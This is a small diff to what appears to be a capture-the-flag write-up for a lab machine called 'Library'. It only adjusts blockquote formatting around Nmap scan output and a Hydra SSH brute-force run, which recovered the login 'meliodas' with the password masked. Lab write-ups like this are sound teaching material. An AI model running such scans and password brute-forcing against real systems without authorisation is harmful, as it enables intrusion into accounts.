@@ -10,12 +10,12 @@ Nmap scan report for 10.10.104.11
 Host is up (0.068s latency).
 Not shown: 998 closed tcp ports (reset)
 PORT   STATE SERVICE VERSION
->22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
+> 22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
 | ssh-hostkey: 
 |   2048 c4:2f:c3:47:67:06:32:04:ef:92:91:8e:05:87:d5:dc (RSA)
 |   256 68:92:13:ec:94:79:dc:bb:77:02:da:99:bf:b6:9d:b0 (ECDSA)
 |_  256 43:e8:24:fc:d8:b8:d3:aa:c2:48:08:97:51:dc:5b:7d (ED25519)
->80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
+> 80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
 |_http-title: Welcome to  Blog - Library Machine
 | http-robots.txt: 1 disallowed entry 
 |_/
@@ -54,7 +54,7 @@ Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-06-02 10:04:
 [WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
 [DATA] max 60 tasks per 1 server, overall 60 tasks, 14344399 login tries (l:1/p:14344399), ~239074 tries per task
 [DATA] attacking ssh://10.10.104.11:22/
->[22][ssh] host: 10.10.104.11   login: meliodas   password: *********
+> [22][ssh] host: 10.10.104.11   login: meliodas   password: *********
 ...
 ```
 
